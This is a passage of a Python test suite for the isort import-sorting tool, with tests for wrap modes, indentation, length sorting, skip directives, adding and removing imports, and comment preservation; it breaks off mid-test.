                                             line_length=40, indent=""    "").output
    assert test_output_hanging_indent == (""from third_party import lib1, lib2, \\\n""
                                          ""    lib3, lib4, lib5, lib6, lib7, \\\n""
                                          ""    lib8, lib9, lib10, lib11, lib12, \\\n""
                                          ""    lib13, lib14, lib15, lib16, lib17, \\\n""
                                          ""    lib18, lib20, lib21, lib22\n"")

    comment_output_hanging_indent = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                                                multi_line_output=WrapModes.HANGING_INDENT,
                                                line_length=40, indent=""    "").output
    assert comment_output_hanging_indent == (""from third_party import lib1, \\  # comment\n""
                                             ""    lib2, lib3, lib4, lib5, lib6, \\\n""
                                             ""    lib7, lib8, lib9, lib10, lib11, \\\n""
                                             ""    lib12, lib13, lib14, lib15, lib16, \\\n""
                                             ""    lib17, lib18, lib20, lib21, lib22\n"")

    test_output_vertical_indent = SortImports(file_contents=REALLY_LONG_IMPORT,
                                              multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                                              line_length=40, indent=""    "").output
    assert test_output_vertical_indent == (""from third_party import (\n""
                                           ""    lib1,\n""
                                           ""    lib2,\n""
                                           ""    lib3,\n""
                                           ""    lib4,\n""
                                           ""    lib5,\n""
                                           ""    lib6,\n""
                                           ""    lib7,\n""
                                           ""    lib8,\n""
                                           ""    lib9,\n""
                                           ""    lib10,\n""
                                           ""    lib11,\n""
                                           ""    lib12,\n""
                                           ""    lib13,\n""
                                           ""    lib14,\n""
                                           ""    lib15,\n""
                                           ""    lib16,\n""
                                           ""    lib17,\n""
                                           ""    lib18,\n""
                                           ""    lib20,\n""
                                           ""    lib21,\n""
                                           ""    lib22\n""
                                           "")\n"")

    comment_output_vertical_indent = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                                                 multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                                                 line_length=40, indent=""    "").output
    assert comment_output_vertical_indent == (""from third_party import (  # comment\n""
                                              ""    lib1,\n""
                                              ""    lib2,\n""
                                              ""    lib3,\n""
                                              ""    lib4,\n""
                                              ""    lib5,\n""
                                              ""    lib6,\n""
                                              ""    lib7,\n""
                                              ""    lib8,\n""
                                              ""    lib9,\n""
                                              ""    lib10,\n""
                                              ""    lib11,\n""
                                              ""    lib12,\n""
                                              ""    lib13,\n""
                                              ""    lib14,\n""
                                              ""    lib15,\n""
                                              ""    lib16,\n""
                                              ""    lib17,\n""
                                              ""    lib18,\n""
                                              ""    lib20,\n""
                                              ""    lib21,\n""
                                              ""    lib22\n""
                                              "")\n"")

    test_output_vertical_grid = SortImports(file_contents=REALLY_LONG_IMPORT,
                                            multi_line_output=WrapModes.VERTICAL_GRID,
                                            line_length=40, indent=""    "").output
    assert test_output_vertical_grid == (""from third_party import (\n""
                                         ""    lib1, lib2, lib3, lib4, lib5, lib6,\n""
                                         ""    lib7, lib8, lib9, lib10, lib11,\n""
                                         ""    lib12, lib13, lib14, lib15, lib16,\n""
                                         ""    lib17, lib18, lib20, lib21, lib22)\n"")

    comment_output_vertical_grid = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                                               multi_line_output=WrapModes.VERTICAL_GRID,
                                               line_length=40, indent=""    "").output
    assert comment_output_vertical_grid == (""from third_party import (  # comment\n""
                                            ""    lib1, lib2, lib3, lib4, lib5, lib6,\n""
                                            ""    lib7, lib8, lib9, lib10, lib11,\n""
                                            ""    lib12, lib13, lib14, lib15, lib16,\n""
                                            ""    lib17, lib18, lib20, lib21, lib22)\n"")

    test_output_vertical_grid_grouped = SortImports(file_contents=REALLY_LONG_IMPORT,
                                                    multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,
                                                    line_length=40, indent=""    "").output
    assert test_output_vertical_grid_grouped == (""from third_party import (\n""
                                                 ""    lib1, lib2, lib3, lib4, lib5, lib6,\n""
                                                 ""    lib7, lib8, lib9, lib10, lib11,\n""
                                                 ""    lib12, lib13, lib14, lib15, lib16,\n""
                                                 ""    lib17, lib18, lib20, lib21, lib22\n""
                                                 "")\n"")

    comment_output_vertical_grid_grouped = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                                                       multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,
                                                       line_length=40, indent=""    "").output
    assert comment_output_vertical_grid_grouped == (""from third_party import (  # comment\n""
                                                    ""    lib1, lib2, lib3, lib4, lib5, lib6,\n""
                                                    ""    lib7, lib8, lib9, lib10, lib11,\n""
                                                    ""    lib12, lib13, lib14, lib15, lib16,\n""
                                                    ""    lib17, lib18, lib20, lib21, lib22\n""
                                                    "")\n"")

    output_noqa = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                              multi_line_output=WrapModes.NOQA).output
    assert output_noqa == (""from third_party import lib1, lib2, lib3, lib4, lib5, lib6, lib7, lib8, lib9, lib10, lib11,""
                           "" lib12, lib13, lib14, lib15, lib16, lib17, lib18, lib20, lib21, lib22  ""
                           ""# NOQA comment\n"")

    test_case = SortImports(file_contents=SINGLE_LINE_LONG_IMPORT,
                            multi_line_output=WrapModes.VERTICAL_GRID_GROUPED_NO_COMMA,
                            line_length=40, indent='    ').output
    test_output_vertical_grid_grouped_doesnt_wrap_early = test_case
    assert test_output_vertical_grid_grouped_doesnt_wrap_early == (""from third_party import (\n""
                                                                   ""    lib1, lib2, lib3, lib4, lib5, lib5ab\n""
                                                                   "")\n"")


def test_qa_comment_case():
    test_input = ""from veryveryveryveryveryveryveryveryveryveryvery import X  # NOQA""
    test_output = SortImports(file_contents=test_input, line_length=40, multi_line_output=WrapModes.NOQA).output
    assert test_output == ""from veryveryveryveryveryveryveryveryveryveryvery import X  # NOQA\n""

    test_input = ""import veryveryveryveryveryveryveryveryveryveryvery  # NOQA""
    test_output = SortImports(file_contents=test_input, line_length=40, multi_line_output=WrapModes.NOQA).output
    assert test_output == ""import veryveryveryveryveryveryveryveryveryveryvery  # NOQA\n""


def test_length_sort():
    """"""Test setting isort to sort on length instead of alphabetically.""""""
    test_input = (""import medium_sizeeeeeeeeeeeeee\n""
                  ""import shortie\n""
                  ""import looooooooooooooooooooooooooooooooooooooong\n""
                  ""import medium_sizeeeeeeeeeeeeea\n"")
    test_output = SortImports(file_contents=test_input, length_sort=True).output
    assert test_output == (""import shortie\n""
                           ""import medium_sizeeeeeeeeeeeeea\n""
                           ""import medium_sizeeeeeeeeeeeeee\n""
                           ""import looooooooooooooooooooooooooooooooooooooong\n"")


def test_length_sort_section():
    """"""Test setting isort to sort on length instead of alphabetically for a specific section.""""""
    test_input = (""import medium_sizeeeeeeeeeeeeee\n""
                  ""import shortie\n""
                  ""import sys\n""
                  ""import os\n""
                  ""import looooooooooooooooooooooooooooooooooooooong\n""
                  ""import medium_sizeeeeeeeeeeeeea\n"")
    test_output = SortImports(file_contents=test_input, length_sort_stdlib=True).output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""\n""
                           ""import looooooooooooooooooooooooooooooooooooooong\n""
                           ""import medium_sizeeeeeeeeeeeeea\n""
                           ""import medium_sizeeeeeeeeeeeeee\n""
                           ""import shortie\n"")


def test_convert_hanging():
    """"""Ensure that isort will convert hanging indents to correct indent
    method.""""""
    test_input = (""from third_party import lib1, lib2, \\\n""
                  ""    lib3, lib4, lib5, lib6, lib7, \\\n""
                  ""    lib8, lib9, lib10, lib11, lib12, \\\n""
                  ""    lib13, lib14, lib15, lib16, lib17, \\\n""
                  ""    lib18, lib20, lib21, lib22\n"")
    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.GRID,
                              line_length=40).output
    assert test_output == (""from third_party import (lib1, lib2,\n""
                           ""                         lib3, lib4,\n""
                           ""                         lib5, lib6,\n""
                           ""                         lib7, lib8,\n""
                           ""                         lib9, lib10,\n""
                           ""                         lib11, lib12,\n""
                           ""                         lib13, lib14,\n""
                           ""                         lib15, lib16,\n""
                           ""                         lib17, lib18,\n""
                           ""                         lib20, lib21,\n""
                           ""                         lib22)\n"")


def test_custom_indent():
    """"""Ensure setting a custom indent will work as expected.""""""
    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,
                              line_length=40, indent=""   "", balanced_wrapping=False).output
    assert test_output == (""from third_party import lib1, lib2, \\\n""
                           ""   lib3, lib4, lib5, lib6, lib7, lib8, \\\n""
                           ""   lib9, lib10, lib11, lib12, lib13, \\\n""
                           ""   lib14, lib15, lib16, lib17, lib18, \\\n""
                           ""   lib20, lib21, lib22\n"")

    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,
                              line_length=40, indent=""'  '"", balanced_wrapping=False).output
    assert test_output == (""from third_party import lib1, lib2, \\\n""
                           ""  lib3, lib4, lib5, lib6, lib7, lib8, \\\n""
                           ""  lib9, lib10, lib11, lib12, lib13, \\\n""
                           ""  lib14, lib15, lib16, lib17, lib18, \\\n""
                           ""  lib20, lib21, lib22\n"")

    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,
                              line_length=40, indent=""tab"", balanced_wrapping=False).output
    assert test_output == (""from third_party import lib1, lib2, \\\n""
                           ""\tlib3, lib4, lib5, lib6, lib7, lib8, \\\n""
                           ""\tlib9, lib10, lib11, lib12, lib13, \\\n""
                           ""\tlib14, lib15, lib16, lib17, lib18, \\\n""
                           ""\tlib20, lib21, lib22\n"")

    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,
                              line_length=40, indent=2, balanced_wrapping=False).output
    assert test_output == (""from third_party import lib1, lib2, \\\n""
                           ""  lib3, lib4, lib5, lib6, lib7, lib8, \\\n""
                           ""  lib9, lib10, lib11, lib12, lib13, \\\n""
                           ""  lib14, lib15, lib16, lib17, lib18, \\\n""
                           ""  lib20, lib21, lib22\n"")


def test_use_parentheses():
    test_input = (
        ""from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import ""
        ""    my_custom_function as my_special_function""
    )
    test_output = SortImports(
        file_contents=test_input, line_length=79, use_parentheses=True
    ).output

    assert test_output == (
        ""from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\n""
        ""    my_custom_function as my_special_function)\n""
    )

    test_output = SortImports(
        file_contents=test_input, line_length=79, use_parentheses=True,
        include_trailing_comma=True,
    ).output

    assert test_output == (
        ""from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\n""
        ""    my_custom_function as my_special_function,)\n""
    )

    test_output = SortImports(
        file_contents=test_input, line_length=79, use_parentheses=True,
        multi_line_output=WrapModes.VERTICAL_HANGING_INDENT
    ).output

    assert test_output == (
        ""from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\n""
        ""    my_custom_function as my_special_function\n)\n""
    )

    test_output = SortImports(
        file_contents=test_input, line_length=79, use_parentheses=True,
        multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,
        include_trailing_comma=True
    ).output

    assert test_output == (
        ""from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\n""
        ""    my_custom_function as my_special_function,\n)\n""
    )


def test_skip():
    """"""Ensure skipping a single import will work as expected.""""""
    test_input = (""import myproject\n""
                  ""import django\n""
                  ""print('hey')\n""
                  ""import sys  # isort:skip this import needs to be placed here\n\n\n\n\n\n\n"")

    test_output = SortImports(file_contents=test_input, known_third_party=['django']).output
    assert test_output == (""import django\n""
                           ""\n""
                           ""import myproject\n""
                           ""\n""
                           ""print('hey')\n""
                           ""import sys  # isort:skip this import needs to be placed here\n"")


def test_skip_with_file_name():
    """"""Ensure skipping a file works even when file_contents is provided.""""""
    test_input = (""import django\n""
                  ""import myproject\n"")

    sort_imports = SortImports(file_path='/baz.py', file_contents=test_input, settings_path=os.getcwd(),
                               skip=['baz.py'])
    assert sort_imports.skipped
    assert sort_imports.output is None


def test_skip_within_file():
    """"""Ensure skipping a whole file works.""""""
    test_input = (""# isort:skip_file\n""
                  ""import django\n""
                  ""import myproject\n"")
    sort_imports = SortImports(file_contents=test_input, known_third_party=['django'])
    assert sort_imports.skipped
    assert sort_imports.output is None


def test_force_to_top():
    """"""Ensure forcing a single import to the top of its category works as expected.""""""
    test_input = (""import lib6\n""
                  ""import lib2\n""
                  ""import lib5\n""
                  ""import lib1\n"")
    test_output = SortImports(file_contents=test_input, force_to_top=['lib5']).output
    assert test_output == (""import lib5\n""
                           ""import lib1\n""
                           ""import lib2\n""
                           ""import lib6\n"")


def test_add_imports():
    """"""Ensures adding imports works as expected.""""""
    test_input = (""import lib6\n""
                  ""import lib2\n""
                  ""import lib5\n""
                  ""import lib1\n\n"")
    test_output = SortImports(file_contents=test_input, add_imports=['import lib4', 'import lib7']).output
    assert test_output == (""import lib1\n""
                           ""import lib2\n""
                           ""import lib4\n""
                           ""import lib5\n""
                           ""import lib6\n""
                           ""import lib7\n"")

    # Using simplified syntax
    test_input = (""import lib6\n""
                  ""import lib2\n""
                  ""import lib5\n""
                  ""import lib1\n\n"")
    test_output = SortImports(file_contents=test_input, add_imports=['lib4', 'lib7', 'lib8.a']).output
    assert test_output == (""import lib1\n""
                           ""import lib2\n""
                           ""import lib4\n""
                           ""import lib5\n""
                           ""import lib6\n""
                           ""import lib7\n""
                           ""from lib8 import a\n"")

    # On a file that has no pre-existing imports
    test_input = ('""""""Module docstring""""""\n'
                  '\n'
                  'class MyClass(object):\n'
                  '    pass\n')
    test_output = SortImports(file_contents=test_input, add_imports=['from __future__ import print_function']).output
    assert test_output == ('""""""Module docstring""""""\n'
                           'from __future__ import print_function\n'
                           '\n'
                           '\n'
                           'class MyClass(object):\n'
                           '    pass\n')

    # On a file that has no pre-existing imports, and no doc-string
    test_input = ('class MyClass(object):\n'
                  '    pass\n')
    test_output = SortImports(file_contents=test_input, add_imports=['from __future__ import print_function']).output
    assert test_output == ('from __future__ import print_function\n'
                           '\n'
                           '\n'
                           'class MyClass(object):\n'
                           '    pass\n')

    # On a file with no content what so ever
    test_input = ("""")
    test_output = SortImports(file_contents=test_input, add_imports=['lib4']).output
    assert test_output == ("""")

    # On a file with no content what so ever, after force_adds is set to True
    test_input = ("""")
    test_output = SortImports(file_contents=test_input, add_imports=['lib4'], force_adds=True).output
    assert test_output == (""import lib4\n"")


def test_remove_imports():
    """"""Ensures removing imports works as expected.""""""
    test_input = (""import lib6\n""
                  ""import lib2\n""
                  ""import lib5\n""
                  ""import lib1"")
    test_output = SortImports(file_contents=test_input, remove_imports=['lib2', 'lib6']).output
    assert test_output == (""import lib1\n""
                           ""import lib5\n"")

    # Using natural syntax
    test_input = (""import lib6\n""
                  ""import lib2\n""
                  ""import lib5\n""
                  ""import lib1\n""
                  ""from lib8 import a"")
    test_output = SortImports(file_contents=test_input, remove_imports=['import lib2', 'import lib6',
                                                                        'from lib8 import a']).output
    assert test_output == (""import lib1\n""
                           ""import lib5\n"")


def test_explicitly_local_import():
    """"""Ensure that explicitly local imports are separated.""""""
    test_input = (""import lib1\n""
                  ""import lib2\n""
                  ""import .lib6\n""
                  ""from . import lib7"")
    assert SortImports(file_contents=test_input).output == (""import lib1\n""
                                                            ""import lib2\n""
                                                            ""\n""
                                                            ""import .lib6\n""
                                                            ""from . import lib7\n"")


def test_quotes_in_file():
    """"""Ensure imports within triple quotes don't get imported.""""""
    test_input = ('import os\n'
                  '\n'
                  '""""""\n'
                  'Let us\n'
                  'import foo\n'
                  'okay?\n'
                  '""""""\n')
    assert SortImports(file_contents=test_input).output == test_input

    test_input = ('import os\n'
                  '\n'
                  ""'\""\""\""'\n""
                  'import foo\n')
    assert SortImports(file_contents=test_input).output == ('import os\n'
                                                            '\n'
                                                            'import foo\n'
                                                            '\n'
                                                            ""'\""\""\""'\n"")

    test_input = ('import os\n'
                  '\n'
                  '""""""Let us""""""\n'
                  'import foo\n'
                  '""""""okay?""""""\n')
    assert SortImports(file_contents=test_input).output == ('import os\n'
                                                            '\n'
                                                            'import foo\n'
                                                            '\n'
                                                            '""""""Let us""""""\n'
                                                            '""""""okay?""""""\n')

    test_input = ('import os\n'
                  '\n'
                  '#""""""\n'
                  'import foo\n'
                  '#""""""')
    assert SortImports(file_contents=test_input).output == ('import os\n'
                                                            '\n'
                                                            'import foo\n'
                                                            '\n'
                                                            '#""""""\n'
                                                            '#""""""\n')

    test_input = ('import os\n'
                  '\n'
                  ""'\\\n""
                  ""import foo'\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = ('import os\n'
                  '\n'
                  ""'''\n""
                  ""\\'''\n""
                  'import junk\n'
                  ""'''\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_check_newline_in_imports(capsys):
    """"""Ensure tests works correctly when new lines are in imports.""""""
    test_input = ('from lib1 import (\n'
                  '    sub1,\n'
                  '    sub2,\n'
                  '    sub3\n)\n')

    SortImports(file_contents=test_input, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT, line_length=20,
                check=True, verbose=True)
    out, err = capsys.readouterr()
    assert 'SUCCESS' in out


def test_forced_separate():
    """"""Ensure that forcing certain sub modules to show separately works as expected.""""""
    test_input = ('import sys\n'
                  'import warnings\n'
                  'from collections import OrderedDict\n'
                  '\n'
                  'from django.core.exceptions import ImproperlyConfigured, SuspiciousOperation\n'
                  'from django.core.paginator import InvalidPage\n'
                  'from django.core.urlresolvers import reverse\n'
                  'from django.db import models\n'
                  'from django.db.models.fields import FieldDoesNotExist\n'
                  'from django.utils import six\n'
                  'from django.utils.deprecation import RenameMethodsBase\n'
                  'from django.utils.encoding import force_str, force_text\n'
                  'from django.utils.http import urlencode\n'
                  'from django.utils.translation import ugettext, ugettext_lazy\n'
                  '\n'
                  'from django.contrib.admin import FieldListFilter\n'
                  'from django.contrib.admin.exceptions import DisallowedModelAdminLookup\n'
                  'from django.contrib.admin.options import IncorrectLookupParameters, IS_POPUP_VAR, TO_FIELD_VAR\n')
    assert SortImports(file_contents=test_input, forced_separate=['django.contrib'],
                       known_third_party=['django'], line_length=120, order_by_type=False).output == test_input

    test_input = ('from .foo import bar\n'
                  '\n'
                  'from .y import ca\n')
    assert SortImports(file_contents=test_input, forced_separate=['.y'],
                       line_length=120, order_by_type=False).output == test_input


def test_default_section():
    """"""Test to ensure changing the default section works as expected.""""""
    test_input = (""import sys\n""
                  ""import os\n""
                  ""import myproject.test\n""
                  ""import django.settings"")
    test_output = SortImports(file_contents=test_input, known_third_party=['django'],
                              default_section=""FIRSTPARTY"").output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""\n""
                           ""import django.settings\n""
                           ""\n""
                           ""import myproject.test\n"")

    test_output_custom = SortImports(file_contents=test_input, known_third_party=['django'],
                                     default_section=""STDLIB"").output
    assert test_output_custom == (""import myproject.test\n""
                                  ""import os\n""
                                  ""import sys\n""
                                  ""\n""
                                  ""import django.settings\n"")


def test_first_party_overrides_standard_section():
    """"""Test to ensure changing the default section works as expected.""""""
    test_input = (""from HTMLParser import HTMLParseError, HTMLParser\n""
                  ""import sys\n""
                  ""import os\n""
                  ""import this\n""
                  ""import profile.test\n"")
    test_output = SortImports(file_contents=test_input, known_first_party=['profile']).output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""import this\n""
                           ""from HTMLParser import HTMLParseError, HTMLParser\n""
                           ""\n""
                           ""import profile.test\n"")


def test_thirdy_party_overrides_standard_section():
    """"""Test to ensure changing the default section works as expected.""""""
    test_input = (""import sys\n""
                  ""import os\n""
                  ""import this\n""
                  ""import profile.test\n"")
    test_output = SortImports(file_contents=test_input, known_third_party=['profile']).output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""import this\n""
                           ""\n""
                           ""import profile.test\n"")


def test_known_pattern_path_expansion():
    """"""Test to ensure patterns ending with path sep gets expanded and nested packages treated as known patterns""""""
    test_input = (""from kate_plugin import isort_plugin\n""
                  ""import sys\n""
                  ""import isort.settings\n""
                  ""import this\n""
                  ""import os\n"")
    test_output = SortImports(
        file_contents=test_input,
        default_section='THIRDPARTY',
        known_first_party=['./', 'this', 'kate_plugin']
    ).output
    assert test_output == (""import os\n""
                            ""import sys\n""
                            ""\n""
                            ""import isort.settings\n""
                            ""import this\n""
                            ""from kate_plugin import isort_plugin\n"")


def test_force_single_line_imports():
    """"""Test to ensure forcing imports to each have their own line works as expected.""""""
    test_input = (""from third_party import lib1, lib2, \\\n""
                  ""    lib3, lib4, lib5, lib6, lib7, \\\n""
                  ""    lib8, lib9, lib10, lib11, lib12, \\\n""
                  ""    lib13, lib14, lib15, lib16, lib17, \\\n""
                  ""    lib18, lib20, lib21, lib22\n"")
    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.GRID,
                              line_length=40, force_single_line=True).output
    assert test_output == (""from third_party import lib1\n""
                           ""from third_party import lib2\n""
                           ""from third_party import lib3\n""
                           ""from third_party import lib4\n""
                           ""from third_party import lib5\n""
                           ""from third_party import lib6\n""
                           ""from third_party import lib7\n""
                           ""from third_party import lib8\n""
                           ""from third_party import lib9\n""
                           ""from third_party import lib10\n""
                           ""from third_party import lib11\n""
                           ""from third_party import lib12\n""
                           ""from third_party import lib13\n""
                           ""from third_party import lib14\n""
                           ""from third_party import lib15\n""
                           ""from third_party import lib16\n""
                           ""from third_party import lib17\n""
                           ""from third_party import lib18\n""
                           ""from third_party import lib20\n""
                           ""from third_party import lib21\n""
                           ""from third_party import lib22\n"")


def test_force_single_line_long_imports():
    test_input = (""from veryveryveryveryveryvery import small, big\n"")
    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.NOQA,
                              line_length=40, force_single_line=True).output
    assert test_output == (""from veryveryveryveryveryvery import big\n""
                           ""from veryveryveryveryveryvery import small  # NOQA\n"")


def test_titled_imports():
    """"""Tests setting custom titled/commented import sections.""""""
    test_input = (""import sys\n""
                  ""import unicodedata\n""
                  ""import statistics\n""
                  ""import os\n""
                  ""import myproject.test\n""
                  ""import django.settings"")
    test_output = SortImports(file_contents=test_input, known_third_party=['django'],
                              import_heading_stdlib=""Standard Library"", import_heading_firstparty=""My Stuff"").output
    assert test_output == (""# Standard Library\n""
                           ""import os\n""
                           ""import statistics\n""
                           ""import sys\n""
                           ""import unicodedata\n""
                           ""\n""
                           ""import django.settings\n""
                           ""\n""
                           ""# My Stuff\n""
                           ""import myproject.test\n"")
    test_second_run = SortImports(file_contents=test_output, known_third_party=['django'],
                                  import_heading_stdlib=""Standard Library"", import_heading_firstparty=""My Stuff"").output
    assert test_second_run == test_output


def test_balanced_wrapping():
    """"""Tests balanced wrapping mode, where the length of individual lines maintain width.""""""
    test_input = (""from __future__ import (absolute_import, division, print_function,\n""
                  ""                        unicode_literals)"")
    test_output = SortImports(file_contents=test_input, line_length=70, balanced_wrapping=True).output
    assert test_output == (""from __future__ import (absolute_import, division,\n""
                           ""                        print_function, unicode_literals)\n"")


def test_relative_import_with_space():
    """"""Tests the case where the relation and the module that is being imported from is separated with a space.""""""
    test_input = (""from ... fields.sproqet import SproqetCollection"")
    assert SortImports(file_contents=test_input).output == (""from ...fields.sproqet import SproqetCollection\n"")
    test_input = (""from .import foo"")
    test_output = (""from . import foo\n"")
    assert SortImports(file_contents=test_input).output == test_output
    test_input = (""from.import foo"")
    test_output = (""from . import foo\n"")
    assert SortImports(file_contents=test_input).output == test_output


def test_multiline_import():
    """"""Test the case where import spawns multiple lines with inconsistent indentation.""""""
    test_input = (""from pkg \\\n""
                  ""    import stuff, other_suff \\\n""
                  ""               more_stuff"")
    assert SortImports(file_contents=test_input).output == (""from pkg import more_stuff, other_suff, stuff\n"")

    # test again with a custom configuration
    custom_configuration = {'force_single_line': True,
                            'line_length': 120,
                            'known_first_party': ['asdf', 'qwer'],
                            'default_section': 'THIRDPARTY',
                            'forced_separate': 'asdf'}  # type: Dict[str, Any]
    expected_output = (""from pkg import more_stuff\n""
                       ""from pkg import other_suff\n""
                       ""from pkg import stuff\n"")
    assert SortImports(file_contents=test_input, **custom_configuration).output == expected_output


def test_single_multiline():
    """"""Test the case where a single import spawns multiple lines.""""""
    test_input = (""from os import\\\n""
                  ""        getuid\n""
                  ""\n""
                  ""print getuid()\n"")
    output = SortImports(file_contents=test_input).output
    assert output == (
        ""from os import getuid\n""
        ""\n""
        ""print getuid()\n""
    )


def test_atomic_mode():
    # without syntax error, everything works OK
    test_input = (""from b import d, c\n""
                  ""from a import f, e\n"")
    assert SortImports(file_contents=test_input, atomic=True).output == (""from a import e, f\n""
                                                                          ""from b import c, d\n"")

    # with syntax error content is not changed
    test_input += ""while True print 'Hello world'""  # blatant syntax error
    assert SortImports(file_contents=test_input, atomic=True).output == test_input


def test_order_by_type():
    test_input = ""from module import Class, CONSTANT, function""
    assert SortImports(file_contents=test_input,
                       order_by_type=True).output == (""from module import CONSTANT, Class, function\n"")

    # More complex sample data
    test_input = ""from module import Class, CONSTANT, function, BASIC, Apple""
    assert SortImports(file_contents=test_input,
                       order_by_type=True).output == (""from module import BASIC, CONSTANT, Apple, Class, function\n"")

    # Really complex sample data, to verify we don't mess with top level imports, only nested ones
    test_input = (""import StringIO\n""
                  ""import glob\n""
                  ""import os\n""
                  ""import shutil\n""
                  ""import tempfile\n""
                  ""import time\n""
                  ""from subprocess import PIPE, Popen, STDOUT\n"")

    assert SortImports(file_contents=test_input, order_by_type=True).output == \
                (""import glob\n""
                 ""import os\n""
                 ""import shutil\n""
                 ""import StringIO\n""
                 ""import tempfile\n""
                 ""import time\n""
                 ""from subprocess import PIPE, STDOUT, Popen\n"")


def test_custom_lines_after_import_section():
    """"""Test the case where the number of lines to output after imports has been explicitly set.""""""
    test_input = (""from a import b\n""
                  ""foo = 'bar'\n"")

    # default case is one space if not method or class after imports
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""foo = 'bar'\n"")

    # test again with a custom number of lines after the import section
    assert SortImports(file_contents=test_input, lines_after_imports=2).output == (""from a import b\n""
                                                                                   ""\n""
                                                                                   ""\n""
                                                                                   ""foo = 'bar'\n"")


def test_smart_lines_after_import_section():
    """"""Tests the default 'smart' behavior for dealing with lines after the import section""""""
    # one space if not method or class after imports
    test_input = (""from a import b\n""
                  ""foo = 'bar'\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""foo = 'bar'\n"")

    # two spaces if a method or class after imports
    test_input = (""from a import b\n""
                  ""def my_function():\n""
                  ""    pass\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""\n""
                                                            ""def my_function():\n""
                                                            ""    pass\n"")

    # two spaces if an async method after imports
    test_input = (""from a import b\n""
                  ""async def my_function():\n""
                  ""    pass\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""\n""
                                                            ""async def my_function():\n""
                                                            ""    pass\n"")

    # two spaces if a method or class after imports - even if comment before function
    test_input = (""from a import b\n""
                  ""# comment should be ignored\n""
                  ""def my_function():\n""
                  ""    pass\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""\n""
                                                            ""# comment should be ignored\n""
                                                            ""def my_function():\n""
                                                            ""    pass\n"")

    # ensure logic works with both style comments
    test_input = (""from a import b\n""
                  '""""""\n'
                  ""    comment should be ignored\n""
                  '""""""\n'
                  ""def my_function():\n""
                  ""    pass\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""\n""
                                                            '""""""\n'
                                                            ""    comment should be ignored\n""
                                                            '""""""\n'
                                                            ""def my_function():\n""
                                                            ""    pass\n"")

    # Ensure logic doesn't incorrectly skip over assignments to multi-line strings
    test_input = (""from a import b\n""
                  'X = """"""test\n'
                  '""""""\n'
                  ""def my_function():\n""
                  ""    pass\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            'X = """"""test\n'
                                                            '""""""\n'
                                                            ""def my_function():\n""
                                                            ""    pass\n"")


def test_settings_combine_instead_of_overwrite():
    """"""Test to ensure settings combine logically, instead of fully overwriting.""""""
    assert set(SortImports(known_standard_library=['not_std_library']).config['known_standard_library']) == \
           set(SortImports().config['known_standard_library'] + ['not_std_library'])

    assert set(SortImports(not_known_standard_library=['thread']).config['known_standard_library']) == \
           {item for item in SortImports().config['known_standard_library'] if item != 'thread'}


def test_combined_from_and_as_imports():
    """"""Test to ensure it's possible to combine from and as imports.""""""
    test_input = (""from translate.misc.multistring import multistring\n""
                  ""from translate.storage import base, factory\n""
                  ""from translate.storage.placeables import general, parse as rich_parse\n"")
    assert SortImports(file_contents=test_input, combine_as_imports=True).output == test_input
    test_input = (""import os \nimport os as _os"")
    test_output = (""import os\nimport os as _os\n"")
    assert SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output == test_output


def test_as_imports_with_line_length():
    """"""Test to ensure it's possible to combine from and as imports.""""""
    test_input = (""from translate.storage import base as storage_base\n""
                  ""from translate.storage.placeables import general, parse as rich_parse\n"")
    assert SortImports(file_contents=test_input, combine_as_imports=False, line_length=40).output == \
                  (""from translate.storage import \\\n    base as storage_base\n""
                   ""from translate.storage.placeables import \\\n    general\n""
                   ""from translate.storage.placeables import \\\n    parse as rich_parse\n"")


def test_keep_comments():
    """"""Test to ensure isort properly keeps comments in tact after sorting.""""""
    # Straight Import
    test_input = (""import foo  # bar\n"")
    assert SortImports(file_contents=test_input).output == test_input

    # Star import
    test_input_star = (""from foo import *  # bar\n"")
    assert SortImports(file_contents=test_input_star).output == test_input_star

    # Force Single Line From Import
    test_input = (""from foo import bar  # comment\n"")
    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input

    # From import
    test_input = (""from foo import bar  # My Comment\n"")
